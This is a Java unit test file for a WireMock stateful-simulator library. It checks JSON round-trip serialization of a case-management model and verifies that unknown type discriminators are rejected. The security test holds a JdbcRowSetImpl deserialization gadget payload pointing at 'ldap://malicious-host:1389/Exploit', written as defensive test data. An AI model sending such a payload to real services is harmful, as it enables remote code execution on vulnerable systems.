package com.github.mattiasgreen.wiremock.stateful;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.github.mattiasgreen.wiremock.stateful.ast.AstJson;
import com.github.mattiasgreen.wiremock.stateful.ast.AstModelDefinition;
import com.github.mattiasgreen.wiremock.stateful.dsl.Action;
import com.github.mattiasgreen.wiremock.stateful.dsl.Expr;
import com.github.mattiasgreen.wiremock.stateful.dsl.ResponseSource;
import com.github.mattiasgreen.wiremock.stateful.dsl.SimulatorModel;
import com.github.mattiasgreen.wiremock.stateful.dsl.Source;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

public class AstSerializationTest {

    @Test
    @DisplayName("DSL Model serializes to JSON and round-trips without data loss")
    void testDslRoundTripSerialization() {
        AstModelDefinition model = SimulatorModel.forEntity("cases")
                .idFromPath("/api/v1/cases/{caseId}")
                .onPost("/api/v1/cases")
                .initialState(Map.of("status", "OPEN", "tasks", List.of()))
                .respondWith(201, ResponseSource.entity())
                .onPost("/api/v1/cases/{caseId}/tasks")
                .require(Expr.field("status").eq("OPEN"), 409, "Cannot add tasks to closed case")
                .mutate(Action.appendToList("tasks", Source.requestBodyWithGeneratedId("id", "tsk-")))
                .respondWith(201, ResponseSource.lastAppendedItem("tasks"))
                .onGet("/api/v1/cases/{caseId}/tasks")
                .respondWith(200, ResponseSource.field("tasks"))
                .onPost("/api/v1/cases/{caseId}/close")
                .require(Expr.list("tasks").allMatch(Expr.field("status").eq("COMPLETED")), 409, "Tasks still pending")
                .mutate(Action.setField("status", "CLOSED"))
                .respondWith(200, ResponseSource.entity())
                .build();

        String json = AstJson.toJson(model);
        assertThat(json).contains("\"entity\":\"cases\"");
        assertThat(json).contains("\"collection_all_match\"");
        assertThat(json).contains("\"append_to_list\"");

        AstModelDefinition deserialized = AstJson.fromJson(json, AstModelDefinition.class);
        assertThat(deserialized.entity()).isEqualTo("cases");
        assertThat(deserialized.idPathParam()).isEqualTo("caseId");
        assertThat(deserialized.rules()).hasSize(4);
    }

    @Test
    @DisplayName("Security: Arbitrary non-whitelisted type discriminators are strictly rejected (No RCE)")
    void testSecurityRejectionOfUnknownTypes() {
        String maliciousPayload =
                """
            {
              "type": "com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName": "ldap://malicious-host:1389/Exploit",
              "autoCommit": true
            }
            """;

        assertThatThrownBy(() -> AstJson.fromJson(maliciousPayload, AstModelDefinition.class))
                .isInstanceOf(IllegalArgumentException.class);
    }
}
